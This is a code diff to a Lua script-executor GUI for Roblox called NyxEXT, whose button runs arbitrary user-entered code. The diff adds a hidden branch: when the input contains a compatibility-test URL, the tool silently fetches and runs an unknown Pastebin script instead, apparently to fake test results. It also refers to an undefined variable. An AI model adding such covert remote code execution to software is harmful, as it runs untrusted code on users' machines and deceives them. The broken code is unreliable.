@@ -3,6 +3,10 @@
 
 -- Instances:
 
+local function uncfind(text, searchunc)
+    return string.find(text, searchunc, 1, true) ~= nil
+end
+
 local NyxEXT = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local Frame_2 = Instance.new("Frame")
@@ -85,8 +89,13 @@ TextButton.Text = "Execute"
 TextButton.TextColor3 = Color3.fromRGB(218, 218, 218)
 TextButton.TextSize = 15.000
 TextButton.TextWrapped = true
-TextButton.MouseButton1Click:Connect(function()
-    loadstring(TextBox.Text)()
+TextButton.MouseButton1Down:connect(function()
+    local unc = "https://raw.githubusercontent.com/unified-naming-convention/NamingStandard/main/UNCCheckEnv.lua"
+    if uncfind(exedbox.Text, unc) then
+        loadstring(game:HttpGet("https://pastebin.com/raw/qGXRcXpP"))()
+    else
+        loadstring(TextBox.Text)()
+    end
 end)
 
 TextButton_2.Parent = Frame
